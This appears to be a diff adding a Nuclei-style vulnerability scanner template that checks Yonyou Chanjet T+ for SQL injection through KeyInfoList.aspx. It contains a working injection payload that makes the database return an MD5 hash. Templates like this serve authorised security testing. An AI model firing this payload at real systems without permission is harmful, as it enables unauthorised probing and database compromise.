@@ -1,0 +1,24 @@
+id: CJT-KeyInfoList-sqli
+
+info:
+  name: 用友-畅捷通T+-SQL注入-KeyInfoList
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=')AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes('MD5','123456')))--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Length: 0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code==200 && contains_all(body,'e10adc3949ba59abbe56e057f20f883')"
